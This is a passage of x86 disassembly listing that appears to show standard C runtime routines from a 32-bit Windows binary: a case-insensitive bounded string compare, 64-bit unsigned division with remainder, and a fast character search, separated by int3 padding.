  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
